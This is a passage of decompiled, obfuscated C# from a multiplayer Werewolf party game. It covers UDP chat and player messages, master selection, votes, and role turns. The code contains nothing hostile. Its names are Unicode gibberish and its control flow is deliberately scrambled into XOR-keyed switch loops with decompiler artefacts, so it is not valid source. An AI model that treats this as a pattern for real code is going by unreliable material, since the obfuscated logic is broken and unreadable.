label_29:
      this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF469(
      object _param1,
      EventArgs _param2)
    {
label_4:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(20);
      int num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
      string text;
      while (true)
      {
        switch ((num2 ^ 57) + 55)
        {
          case 0:
            goto label_4;
          case 1:
            bool flag;
            switch (num1 + 62)
            {
              case 0:
                if (flag)
                {
                  num1 = -8;
                  goto label_1;
                }
                else
                  goto label_14;
              case 1:
                text = this.MessageInput.Text;
                num1 = -6;
                goto label_1;
              case 2:
                flag = !string.IsNullOrEmpty(text);
                num1 = -4;
                goto label_1;
              case 3:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF496);
                num1 = -5;
                goto label_1;
              case 4:
                goto label_13;
              default:
                num2 = -16;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49D);
            num2 = -14;
            continue;
          case 3:
label_1:
            num1 ^= 62;
            break;
        }
        num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
      }
label_13:
      int num3 = 0;
      goto label_15;
label_14:
      num3 = 1;
label_15:
      if (num3 != 0)
        return;
      byte[] bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + ": " + text);
      this.sendingClientChat.Send(bytes, bytes.Length);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46A()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9655);
      while (true)
      {
        string[] strArray;
        do
        {
          string Expression = Encoding.ASCII.GetString(this.receivingClientPlayerInfo.Receive(ref remoteEP));
          this.PlayerExists = false;
          strArray = Strings.Split(Expression, "<>");
          object Left = (object) 0;
          if ((strArray[3].Equals(this.randomIntegerID.ToString()) ? 1 : 0) == 0)
          {
            this.recievedID = strArray[3];
            int num1 = checked (this.PlayerList.Count - 1);
            int index1 = 0;
            if (index1 == 0)
              goto label_5;
label_2:
            if ((!this.PlayerList[index1].GetUniquePlayerID.Equals(this.recievedID) ? 1 : 0) == 0)
            {
              this.PlayerExists = true;
              goto label_6;
            }
            else
            {
              Left = Operators.AddObject(Left, (object) 1);
              checked { ++index1; }
            }
label_5:
            if (index1 <= num1)
              goto label_2;
label_6:
            if ((this.PlayerExists ? 1 : 0) == 0)
            {
              Player player = new Player(Conversions.ToInteger(Operators.AddObject(Left, (object) 1)), strArray[1], strArray[0]);
label_9:
              int num2 = 6;
              while (true)
              {
                int num3;
                int num4;
                switch (num2 ^ 57)
                {
                  case 60:
                    this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "Player " + strArray[0] + " Joined.");
                    num2 = 7;
                    continue;
                  case 61:
                    num2 = 126;
                    continue;
                  case 62:
                    num2 = 120;
                    continue;
                  case 63:
                    player.SetUniquePlayerID(this.recievedID);
                    num2 = 121;
                    continue;
                  case 64:
                    num2 = 5;
                    continue;
                  case 65:
                    this.PlayerList.Add(player);
                    num2 = 4;
                    continue;
                  case 66:
                    if (num3 != 0)
                    {
                      num2 = (int) sbyte.MaxValue;
                      continue;
                    }
                    break;
                  case 67:
                    this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B6(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF499));
                    num2 = 113;
                    continue;
                  case 68:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.set_PlayerName6);
                    num2 = 125;
                    continue;
                  case 69:
                    num3 = 0;
                    num2 = 123;
                    continue;
                  case 70:
label_21:
                    this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3BB(this.EnableNewCardForPlayer), (object) num3);
                    num2 = 122;
                    continue;
                  case 71:
                    num4 = checked (this.PlayerList.Count - 1);
                    num2 = 124;
                    continue;
                  case 72:
                    checked { ++num3; }
                    break;
                  default:
                    goto label_9;
                }
                if (num3 <= num4)
                  goto label_21;
                else
                  break;
              }
            }
            if ((!strArray[5].Contains("InitialSend") ? 1 : 0) == 0)
            {
              int getPlayerNumber = this.thisPlayer.GetPlayerNumber;
label_28:
              int num5 = 7;
              string str;
              byte[] bytes;
              while (true)
              {
                switch (num5 ^ 60)
                {
                  case 58:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF492);
                    num5 = 6;
                    continue;
                  case 59:
                    str = getPlayerNumber.ToString();
                    num5 = 0;
                    continue;
                  case 60:
                    bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>" + str + "<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>ReSend");
                    num5 = 1;
                    continue;
                  case 61:
                    this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                    num5 = 2;
                    continue;
                  case 62:
                    goto label_33;
                  default:
                    goto label_28;
                }
              }
            }
label_33:
            if ((!strArray[5].Contains("ReSend") ? 1 : 0) == 0)
            {
              this.isMasterList.Add(strArray[4]);
              int num6 = checked (this.isMasterList.Count - 1);
              int index2 = 0;
              if (index2 == 0)
                goto label_38;
label_35:
              if ((!this.isMasterList[index2].Contains("True") ? 1 : 0) == 0)
              {
                this.isMaster = false;
                goto label_39;
              }
              else
              {
                this.isMaster = true;
                checked { ++index2; }
              }
label_38:
              if (index2 <= num6)
                goto label_35;
label_39:
              if ((!this.isMaster ? 1 : 0) == 0)
              {
                byte[] bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>UpdateRoundTimeLimit<>" + this.RoundTime);
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
              }
            }
            if ((!strArray[5].Contains("Disconnected") ? 1 : 0) == 0)
            {
              int integer = Conversions.ToInteger(Left);
              int index3 = 1;
              if (index3 != 0)
                goto label_47;
label_44:
              if ((!strArray[3].Equals(this.PlayerList[index3].GetUniquePlayerID) ? 1 : 0) == 0)
              {
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "Player " + this.PlayerList[index3].GetPlayerName + " has disconnected.");
                this.PlayerList.RemoveAt(index3);
                Left = Operators.SubtractObject(Left, (object) 1);
              }
              checked { ++index3; }
label_47:
              if (index3 > integer)
              {
                int num7 = checked (this.isReadyList.Count - 1);
                int index4 = 0;
                if (index4 == 0)
                  goto label_52;
label_49:
                if ((!strArray[3].Equals(this.isReadyList[index4]) ? 1 : 0) == 0)
                  this.isReadyList.RemoveAt(index4);
                checked { ++index4; }
label_52:
                if (index4 > num7)
                {
                  if ((this.PlayerList.Count >= 3 ? 1 : 0) == 0)
                    this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E(this.ReadyToStart, "Not Enough Players");
                }
                else
                  goto label_49;
              }
              else
                goto label_44;
            }
          }
          if ((!strArray[5].Contains("NameChanged") ? 1 : 0) == 0)
          {
            int num = checked (this.PlayerList.Count - 1);
            int index = 0;
            if (index == 0)
              goto label_62;
label_59:
            if ((!this.PlayerList[index].GetUniquePlayerID.Equals(strArray[3]) ? 1 : 0) == 0)
              this.PlayerList[index].SetPlayerName(strArray[0]);
            checked { ++index; }
label_62:
            if (index > num)
              this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B6(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF499));
            else
              goto label_59;
          }
          if ((!strArray[5].Contains("UpdateRoundTimeLimit") ? 1 : 0) == 0 && (strArray[6].Equals(this.RoundTime) ? 1 : 0) == 0)
          {
            this.RoundTime = strArray[6];
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "Round Time Set to " + this.RoundTime + " minutes.");
          }
          if ((!strArray[5].Contains("UpdateKillVotes") ? 1 : 0) == 0)
          {
            int num = checked (this.PlayerList.Count - 1);
            int index = 0;
            if (index == 0)
              goto label_73;
label_68:
            if ((!strArray[3].Equals(this.PlayerList[index].GetUniquePlayerID) ? 1 : 0) == 0)
            {
              this.PlayerList[index].AddVote();
              if ((!strArray[4].Equals("Hunter") ? 1 : 0) == 0)
                this.PlayerList[index].SetHunterSights(true);
            }
            checked { ++index; }
label_73:
            if (index <= num)
              goto label_68;
          }
          if ((!strArray[5].Contains("UpdateVotesToEndRound") ? 1 : 0) == 0)
            this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B8(this.VoteToEndRound));
          if ((!strArray[5].Contains("RestartRound") ? 1 : 0) == 0)
          {
            this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B9(this.RestartRound));
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "Master Restarted Round.");
          }
          if ((!strArray[5].Contains("UpdateCharacterList") ? 1 : 0) == 0)
          {
            this.CharacterList.Add(strArray[6]);
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "Master Added " + strArray[6] + " Role.");
          }
          if ((!(this.PlayerList.Count >= 3 & this.CharacterList.Count == checked (this.PlayerList.Count + 3)) ? 1 : 0) == 0)
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E(this.ReadyToStart, "Ready To Start?");
          else if ((this.CharacterList.Count >= checked (this.PlayerList.Count + 3) ? 1 : 0) == 0)
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E(this.ReadyToStart, "Not Enough Roles Added");
          else if ((this.PlayerList.Count >= 3 ? 1 : 0) == 0)
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E(this.ReadyToStart, "Not Enough Players");
        }
        while ((!(this.isMaster & strArray[5].Contains("InitialSend")) ? 1 : 0) != 0);
        this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, "You are Master.");
        this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3BA(this.SetRestartRoundButton), (object) true);
        this.RestartRoundButton.Enabled = true;
        byte[] bytes1 = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + " is Master.");
        this.sendingClientChat.Send(bytes1, bytes1.Length);
      }
    }

    public void EnableNewCardForPlayer(int i)
    {
label_4:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      int num2 = -11;
      while (true)
      {
        switch ((num2 ^ 61) + 59)
        {
          case 0:
            goto label_4;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.NameChanged);
            num2 = -5;
            continue;
          case 2:
            switch (num1 + 57)
            {
              case 0:
                num1 = -11;
                goto label_1;
              case 1:
                this.ListOfPlayerNameLabels[i].Visible = true;
                num1 = -2;
                goto label_1;
              case 2:
                this.ListOfPlayerCards[i].Visible = true;
                num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
                goto label_1;
              case 3:
                num1 = -15;
                goto label_1;
              case 4:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF493);
                num1 = -14;
                goto label_1;
              case 5:
                goto label_11;
              default:
                num2 = -8;
                continue;
            }
          case 3:
label_1:
            num1 ^= 57;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
      }
label_11:;
    }

    public void SetRestartRoundButton(bool Enabled)
    {
label_4:
      int num1 = 5;
      int num2 = 0;
      while (true)
      {
        switch (num2 ^ 62)
        {
          case 59:
            goto label_4;
          case 60:
            switch (num1)
            {
              case 57:
                this.RestartRoundButton.Enabled = Enabled;
                num1 = 7;
                goto label_1;
              case 58:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_GetRoundTime);
                num1 = 6;
                goto label_1;
              case 59:
                num1 = 0;
                goto label_1;
              case 60:
                goto label_9;
              default:
                num2 = 5;
                continue;
            }
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm._Lambda\u0024__R223\u002D1);
            num2 = 3;
            continue;
          case 62:
label_1:
            num1 ^= 60;
            break;
        }
        num2 = 2;
      }
label_9:;
    }

    public void NameChanged()
    {
label_7:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
      int num2 = -6;
      while (true)
      {
        switch ((num2 ^ 63) + 62)
        {
          case 0:
            int getPlayerNumber;
            string str;
            byte[] bytes;
            switch (num1 + 58)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_GetPlayerList);
                num1 = -7;
                goto label_1;
              case 1:
                getPlayerNumber = this.thisPlayer.GetPlayerNumber;
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
                goto label_1;
              case 2:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>" + str + "<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>NameChanged");
                num1 = -11;
                goto label_1;
              case 3:
                str = getPlayerNumber.ToString();
                num1 = -9;
                goto label_1;
              case 4:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = -12;
                goto label_1;
              case 5:
                goto label_12;
              default:
                num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48F);
            num2 = -4;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 63;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(20);
      }
label_12:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46B()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9654);
label_12:
      byte[] bytes = this.receivingClientChat.Receive(ref remoteEP);
label_4:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
      int num2 = 12;
      while (true)
      {
        switch (num2 ^ 54)
        {
          case 55:
            goto label_4;
          case 56:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF494);
            num2 = 14;
            continue;
          case 57:
            string str;
            switch (num1 + 55)
            {
              case 0:
                num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
                goto label_1;
              case 1:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(this.ChatBox, str);
                num1 = -1;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.EnableSettingsButton);
                num1 = -3;
                goto label_1;
              case 3:
                str = Encoding.ASCII.GetString(bytes);
                num1 = -4;
                goto label_1;
              case 4:
                goto label_12;
              default:
                num2 = 1;
                continue;
            }
          case 58:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = 15;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46C()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9653);
      while (true)
      {
        string str;
        do
        {
          byte[] bytes = this.receivingClient.Receive(ref remoteEP);
label_4:
          int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(12);
          int num2 = -3;
          while (true)
          {
            switch ((num2 ^ 55) + 57)
            {
              case 0:
                goto label_4;
              case 1:
                bool isMaster;
                switch (num1 + 57)
                {
                  case 0:
                    isMaster = this.isMaster;
                    num1 = -15;
                    goto label_1;
                  case 1:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49A);
                    num1 = -16;
                    goto label_1;
                  case 2:
                    if (isMaster)
                    {
                      num1 = -13;
                      goto label_1;
                    }
                    else
                      goto label_14;
                  case 3:
                    str = Encoding.ASCII.GetString(bytes);
                    num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
                    goto label_1;
                  case 4:
                    goto label_13;
                  default:
                    num2 = -16;
                    continue;
                }
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_Card1);
                num2 = -2;
                continue;
              case 3:
label_1:
                num1 ^= 56;
                break;
            }
            num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
          }
label_13:
          int num3 = 0;
          goto label_15;
label_14:
          num3 = 1;
label_15:
          if (num3 != 0)
            ;
        }
        while ((this.isMaster ? 1 : 0) != 0);
        this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B4(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF488), (object) str);
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D(
      RichTextBox _param1,
      string _param2)
    {
      if ((!this.ChatBox.InvokeRequired ? 1 : 0) == 0)
      {
        this.ChatBox.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B1(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D), (object) _param1, (object) _param2);
      }
      else
      {
        string[] strArray = Strings.Split(_param2, ": ");
        if ((this.ChatBox.TextLength <= 0 ? 1 : 0) == 0 && (this.ChatBox.Find(strArray[0], this.Pos, RichTextBoxFinds.None) <= 0 ? 1 : 0) == 0)
        {
          int red = checked ((int) Conversion.Int((float) unchecked ((double) byte.MaxValue * (double) VBMath.Rnd() + 1.0)));
label_5:
          int num = 124;
          int green;
          int blue;
          Color color;
          while (true)
          {
            switch (num ^ 60)
            {
              case 59:
                color = Color.FromArgb(red, green, blue);
                num = 0;
                continue;
              case 60:
                this.ChatBox.SelectionColor = color;
                num = 3;
                continue;
              case 61:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.set_TurnLabel);
                num = 1;
                continue;
              case 62:
                blue = checked ((int) Conversion.Int((float) unchecked ((double) byte.MaxValue * (double) VBMath.Rnd() + 1.0)));
                num = 7;
                continue;
              case 63:
                num = 125;
                continue;
              case 64:
                green = checked ((int) Conversion.Int((float) unchecked ((double) byte.MaxValue * (double) VBMath.Rnd() + 1.0)));
                num = 2;
                continue;
              case 65:
                goto label_13;
              default:
                goto label_5;
            }
          }
        }
label_13:
        int num1 = 123;
        while (true)
        {
          switch (num1 ^ 63)
          {
            case 61:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47A);
              num1 = 2;
              continue;
            case 62:
              num1 = 0;
              continue;
            case 63:
              this.ChatBox.ScrollToCaret();
              num1 = (int) sbyte.MaxValue;
              continue;
            case 64:
              num1 = 126;
              continue;
            case 65:
              this.MessageInput.Text = "";
              num1 = 125;
              continue;
            case 66:
              num1 = 124;
              continue;
            case 67:
              this.Pos = 0;
              num1 = 122;
              continue;
            case 68:
              this.ChatBox.AppendText(_param2 + "\r\n");
              num1 = 1;
              continue;
            case 69:
              goto label_22;
            default:
              goto label_13;
          }
        }
label_22:;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E(
      CheckBox _param1,
      string _param2)
    {
      if ((!_param1.InvokeRequired ? 1 : 0) == 0)
      {
        this.ReadyToStart.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B2(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E), (object) _param1, (object) _param2);
      }
      else
      {
        if ((!_param2.Equals("Ready To Start?") ? 1 : 0) == 0)
        {
          _param1.Enabled = true;
          _param1.Text = _param2;
        }
        else if ((!_param2.Equals("Not Enough Players") ? 1 : 0) == 0)
        {
          _param1.Enabled = false;
label_7:
          int num = 1;
          while (true)
          {
            switch (num ^ 60)
            {
              case 59:
                num = 126;
                continue;
              case 60:
                num = 124;
                continue;
              case 61:
                num = 125;
                continue;
              case 62:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.get_RestartRoundButton);
                num = 2;
                continue;
              case 63:
                num = 7;
                continue;
              case 64:
                _param1.Text = _param2;
                num = 3;
                continue;
              case 65:
                _param1.Checked = false;
                num = 0;
                continue;
              case 66:
                goto label_25;
              default:
                goto label_7;
            }
          }
        }
        else if ((!_param2.Equals("Not Enough Roles Added") ? 1 : 0) == 0)
        {
          _param1.Enabled = false;
label_18:
          int num = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
          while (true)
          {
            switch ((num ^ 59) + 57)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48B);
                num = -4;
                continue;
              case 1:
                _param1.Checked = false;
                num = -16;
                continue;
              case 2:
                num = -10;
                continue;
              case 3:
                _param1.Text = _param2;
                num = -14;
                continue;
              case 4:
                num = -15;
                continue;
              case 5:
                num = -13;
                continue;
              case 6:
                goto label_25;
              default:
                goto label_18;
            }
          }
        }
label_25:;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46F(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("WereWolf") & !this.SawCard & this.OneWereWolf & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_7:
      int num1 = 3;
      int num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
      while (true)
      {
        switch ((num2 ^ 58) + 61)
        {
          case 0:
            switch (num1)
            {
              case 63:
                num1 = 125;
                goto label_2;
              case 64:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49C(_param1);
                num1 = 126;
                goto label_2;
              case 65:
                this.SawCard = true;
                num1 = 124;
                goto label_2;
              case 66:
                num1 = 120;
                goto label_2;
              case 67:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.VoteToEndRound);
                num1 = (int) sbyte.MaxValue;
                goto label_2;
              case 68:
                goto label_15;
              default:
                num2 = -2;
                continue;
            }
          case 1:
            goto label_7;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName5);
            num2 = -1;
            continue;
          case 3:
label_2:
            num1 ^= 60;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      }
label_15:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF470(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("Seer") & !this.SawCard & this.TurnAllowed & this.CardCount < 2) ? 1 : 0) == 0)
      {
        \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_8:
